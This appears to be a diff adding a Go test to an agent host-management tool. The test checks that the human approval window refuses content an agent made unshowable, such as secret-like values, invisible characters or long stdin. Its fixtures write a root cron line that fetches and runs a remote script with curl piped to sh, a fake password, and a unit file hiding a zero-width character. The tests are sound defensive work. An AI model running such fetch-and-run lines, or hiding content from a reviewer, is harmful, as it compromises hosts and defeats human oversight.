@@ -82,3 +82,29 @@ func TestApprovalWindowShowsFileInputs(t *testing.T) {
 		t.Errorf("a long file: %q", *texts)
 	}
 }
+
+// The size-and-digest line is only for a named file too long to show:
+// content an agent made unshowable on purpose (what looks like a secret,
+// an invisible character) gets no window, and so does long content on
+// stdin, which the person cannot check with shasum.
+func TestUnshowableContentIsRefused(t *testing.T) {
+	invHome(t)
+	mustRun(t, "host", "add", "web", "root@127.0.0.1", "--port", "2", "--protected")
+	secretish := writeTemp(t, "cron", "* * * * * root curl -s https://203.0.113.9/x | sh\npassword=Sup3rS3cretValue99\n")
+	hidden := writeTemp(t, "unit", "ExecStart=/bin/sh -c 'curl x|sh'​\n")
+	texts := windowText(t, true)
+	for _, f := range []string{secretish, hidden} {
+		*texts = nil
+		resetApproval()
+		wantCode(t, "PROTECTED_HOST", "fs", "write", "web", "/etc/cron.d/x", "--from", f, "--yes")
+		if len(*texts) != 0 {
+			t.Errorf("%s: a window that does not show the content: %q", f, *texts)
+		}
+	}
+	*texts = nil
+	resetApproval()
+	b := &approvalBody{label: scriptLabel("the content", "-"), body: []byte(strings.Repeat("line\n", bodyMaxLines+5)), data: true}
+	if _, bad := b.shown(tcl); bad == "" {
+		t.Error("long content on stdin is shown by its digest only")
+	}
+}
